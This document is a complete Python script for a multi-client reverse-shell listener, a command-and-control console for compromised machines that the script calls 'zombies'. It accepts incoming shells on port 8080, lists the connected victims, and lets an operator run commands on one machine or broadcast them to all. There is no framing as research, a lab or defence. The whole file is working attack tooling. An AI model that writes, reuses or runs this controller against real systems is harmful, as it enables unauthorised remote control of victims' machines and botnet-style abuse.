#!/usr/bin/env python3
import socket
import threading
import queue
import signal
import sys
import datetime
import time

class ReverseShellListener:
    def __init__(self, host="0.0.0.0", port=8080):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.zombies = []  # Store clients here
        self.zombie_lock = threading.Lock()
        self.shutdown_flag = False
        
        # Setup signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def start(self):
        """Start the listener and wait for connections"""
        try:
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            print(f"[+] Listening on {self.host}:{self.port}")
            
            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            self.main_menu()
            
        except Exception as e:
            print(f"[!] Error starting listener: {e}")
        finally:
            self.cleanup()

    def accept_connections(self):
        """Accept new incoming connections"""
        while not self.shutdown_flag:
            try:
                client_sock, addr = self.server.accept()
                client_addr = f"{addr[0]}:{addr[1]}"
                
                with self.zombie_lock:
                    zombie_id = len(self.zombies) + 1
                    zombie = {
                        "id": zombie_id,
                        "socket": client_sock,
                        "address": client_addr,
                        "thread": None,
                        "queue": queue.Queue(),
                        "active": True
                    }
                    self.zombies.append(zombie)
                    
                print(f"[+] New zombie connected: #{zombie_id} [{client_addr}]")
                
                # Start handler thread for this zombie
                handler = threading.Thread(
                    target=self.handle_zombie,
                    args=(zombie,),
                    daemon=True
                )
                handler.start()
                zombie["thread"] = handler
                
            except Exception as e:
                if not self.shutdown_flag:
                    print(f"[!] Accept error: {e}")

    def handle_zombie(self, zombie):
        """Handle communication with a single zombie"""
        try:
            while zombie["active"] and not self.shutdown_flag:
                # Check if there are any queued commands
                try:
                    cmd = zombie["queue"].get_nowait()
                    if cmd == "disconnect":
                        zombie["active"] = False
                        break
                        
                    zombie["socket"].sendall(cmd.encode("utf-8") + b"\r\n")
                    
                    # Wait for response
                    response = self.receive_from_zombie(zombie["socket"])
                    print(response)
                    
                    zombie["queue"].task_done()
                    
                except queue.Empty:
                    # No commands waiting, sleep briefly before checking again
                    time.sleep(0.1)
                    
        except Exception as e:
            print(f"[!] Error handling zombie {zombie['id']}: {e}")
        finally:
            self.disconnect_zombie(zombie)

    def receive_from_zombie(self, sock):
        """Receive data from a zombie"""
        buffer_size = 4096
        data = b""
        
        try:
            while True:
                chunk = sock.recv(buffer_size)
                if not chunk:
                    break
                data += chunk
                
                # Simple end-of-response trigger (customize as needed)
                if b"$ " in chunk or b"> " in chunk:
                    break
                    
        except Exception as e:
            print(f"[!] Receive error: {e}")
            
        try:
            return data.decode("utf-8", errors="replace")
        except Exception:
            return data.hex()

    def disconnect_zombie(self, zombie):
        """Clean up and remove a zombie"""
        try:
            zombie["socket"].shutdown(socket.SHUT_RDWR)
            zombie["socket"].close()
        except Exception:
            pass
            
        with self.zombie_lock:
            if zombie in self.zombies:
                print(f"[-] Disconnected zombie #{zombie['id']} [{zombie['address']}]")
                self.zombies.remove(zombie)

    def main_menu(self):
        """Display the main menu and handle user input"""
        while not self.shutdown_flag:
            print("\n--- Main Menu ---")
            print("1. List zombies")
            print("2. Interact with a zombie")
            print("3. Send command to all zombies")
            print("4. Disconnect a zombie")
            print("5. Exit")
            
            choice = input("\nEnter option: ").strip()
            
            if choice == "1":
                self.list_zombies()
            elif choice == "2":
                self.interact_with_zombie()
            elif choice == "3":
                self.broadcast_command()
            elif choice == "4":
                self.disconnect_selected_zombie()
            elif choice == "5":
                self.shutdown_flag = True
                print("\nExiting... Please wait for clean shutdown.")
                break
            else:
                print("[!] Invalid option")

    def list_zombies(self):
        """List all connected zombies"""
        print("\n--- Connected Zombies ---")
        with self.zombie_lock:
            if not self.zombies:
                print("No active zombies")
            else:
                print(f"Total zombies: {len(self.zombies)}")
                for idx, zombie in enumerate(self.zombies):
                    id_str = f"#{zombie['id']}"
                    status = "[ACTIVE]" if zombie["active"] else "[DISCONNECTED]"
                    print(f"{id_str:<6} {status} - {zombie['address']}")

    def interact_with_zombie(self):
        """Interact with a specific zombie"""
        try:
            zombie_id = int(input("\nEnter zombie ID to interact with: "))
            
            with self.zombie_lock:
                for zombie in self.zombies:
                    if zombie["id"] == zombie_id:
                        if not zombie["active"]:
                            print("[!] This zombie is inactive")
                            return
                        
                        print(f"\nInteracting with zombie #{zombie_id}")
                        print("Type 'back' to return to main menu")
                        
                        while not self.shutdown_flag and zombie["active"]:
                            try:
                                cmd = input("\nZombie#{}> ".format(zombie_id)).strip()
                                
                                if not cmd:
                                    continue
                                    
                                if cmd.lower() == "back":
                                    break
                                    
                                zombie["queue"].put(cmd)
                                zombie["queue"].join()  # Wait for command execution
                                
                            except BrokenPipeError:
                                print("[!] Command pipe broken")
                                break
                                
                        break
                else:
                    print("[!] Zombie not found")
                    
        except ValueError:
            print("[!] Please enter a valid number")

    def broadcast_command(self):
        """Send a command to all zombies"""
        try:
            cmd = input("\nEnter command to broadcast: ").strip()
            
            if not cmd:
                print("[!] Empty command")
                return
                
            with self.zombie_lock:
                for zombie in self.zombies:
                    if zombie["active"]:
                        zombie["queue"].put(cmd)
                        print(f"Sent to zombie #{zombie['id']}")
                        
        except Exception as e:
            print(f"[!] Broadcast error: {e}")

    def disconnect_selected_zombie(self):
        """Disconnect a specific zombie"""
        try:
            zombie_id = int(input("\nEnter zombie ID to disconnect: "))
            
            with self.zombie_lock:
                for zombie in self.zombies:
                    if zombie["id"] == zombie_id:
                        if zombie["active"]:
                            print(f"Disconnecting zombie #{zombie_id}...")
                            zombie["queue"].put("disconnect")
                            zombie["queue"].join()
                        else:
                            print(f"Zombie #{zombie_id} is already disconnected")
                        return
                        
            print("[!] Zombie not found")
            
        except ValueError:
            print("[!] Please enter a valid number")

    def cleanup(self):
        """Clean up resources before exiting"""
        print("\nCleaning up...")
        
        # Signal all threads to stop
        self.shutdown_flag = True
        
        # Close all zombie connections
        with self.zombie_lock:
            for zombie in self.zombies:
                if zombie["active"]:
                    try:
                        zombie["queue"].put("disconnect")
                        zombie["queue"].join()
                    except Exception:
                        pass
        
        # Shutdown server socket
        try:
            self.server.shutdown(socket.SHUT_RDWR)
            self.server.close()
        except Exception:
            pass
            
        print("Cleanup complete")

    def signal_handler(self, signum, frame):
        """Handle SIGINT and SIGTERM signals"""
        print(f"\nReceived signal {signum}, shutting down...")
        self.shutdown_flag = True

if __name__ == "__main__":
    listener = ReverseShellListener()
    listener.start()